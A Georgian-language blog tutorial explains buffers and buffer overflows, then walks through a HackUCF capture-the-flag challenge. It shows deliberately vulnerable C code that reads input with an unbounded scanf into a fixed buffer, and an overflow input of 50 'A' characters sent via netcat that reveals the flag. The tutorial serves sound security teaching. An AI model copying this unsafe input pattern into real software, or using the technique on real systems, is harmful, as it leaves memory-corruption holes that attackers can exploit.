---
title: "Buffer Overflow ქართულად"
date: 2024-12-23 00:00:00 -0800
categories: Explanations ქართულად
tags: ახსნა ქართულად tutorials explanaton
--- 
# რა არის Buffer?

Buffer არის ინფორმაციის შენახვის ადგილი კომპიუტერის მეხსიერებაში, რომელიც გამოიყენება მონაცემთა დამუშავებისთვის და მონაცემთა შესანახად.

მაგალითად ავიღოთ კოდი:

```c
#include <stdio.h>

int main() {
    char name[5];
    
    printf("სახელი: ");
    scanf("%s", name);
    
    printf("გამარჯობა, %s\n", name); 
    return 0;
}
```

ამ შემთხვევაში, Buffer არის name, რომელელშიც შეგვიძლია შევინახოთ მაქსიმუმ 5 სიმბოლო.

# რა არის Buffer Overflow?

Buffer Overflow არის შეხწევადობა რომელიც მაქსიმუმ ინფორმაციაზე მეტის შეტანის შემდეგ ხდება. მაგალითად შეგვიძლია ავიღოთ სათლი და დავიწყოთ მაში წყლის ჩასხმა. თუ ლიმიტზე მეტ წყალს ჩავასხავთ, წყალლი სათლიდან გადმოსვლას დაიწყებს.

ამ შემთხვევაში, ჩვენ თუ შევიტანთ ლიმიტზე მეტ ინფორმაციას, ჩვენი პროგრამა ვერ იმუშავებს ისე როგორც უნდა ემუშავა.

პროგრამამ უნდა იმუშავოს ასე:

```sh
jstr$ gcc main.c
jstr$ ./a.out
სახელი: test1
გამარჯობა, test1
```

თუ შევიტანთ 5ზე მეტ სიმბოლოს, გვექნება ასეთი შედეგი:

```
jstr$ ./a.out
სახელი: Jester
*** stack smashing detected ***: terminated
Aborted (core dumped)
```

`stack smashing detected` ნიშნავს რომ კომპაილერმა (ამ შემთხვევაში gcc-მ) შეამჩნია რომ Buffer Overflow მოხდა, და კოდის ტერმინაცია მოახდინა.

# Buffer Overflow-ს გამოყენება

მაგალითად გამოვიყენებთ HackUCF-ის ამოცანას:

```
Pwn that buffer!

nc ctf.hackucf.org 9000
```

მიბმულია ორი ფაილი, bof1 და bof1.c

გავუშვათ Net Cat:

```
jstr$ nc ctf.hackucf,org 9000

test
Nope!
```

`test` ის შეტანის დროს პასუხად გამოიტანა `Nope!`. მოდით შევხედოთ C ფაილს.

```c
#include <stdio.h>
#include <stdlib.h>

void win(void) {
	char flag[64];
	
	FILE* fp = fopen("flag.txt", "r");
	if(!fp) {
		puts("error, contact admin");
		exit(0);
	}
	
	fgets(flag, sizeof(flag), fp);
	fclose(fp);
	puts(flag);
}

int main(void) {
	int admin = 0;
	char buf[32];
	
	scanf("%s", buf);
	
	if(admin) {
		win();
	}
	else {
		puts("nope!");
	}
	
	return 0;
}
```

რადგანაც `buf`-ს აქვს 32 სიმბოლოს ლიმიტი, ჩვენ უნდა შევიტანოთ 32 სიმბოლოზე მეტი.

```
jstr$ python3
Python 3.13.1 (tags/v3.13.1:0671451, Dec  3 2024, 19:06:28) [MSC v.1942 64 bit (AMD64)] on win32
Type "help", "copyright", "credits" or "license" for more information.
>>> print('A'* 50)
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
```

(Python-ს იმიტომ ვიყენებ რომ დათვლა მეზარება T_T )

კიდევ ერთხელ გამოვიყენოთ NetCat :
```
jstr$ nc ctf.hackucf.org 9000
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
flag{my_first_buffer_overflow!}
```


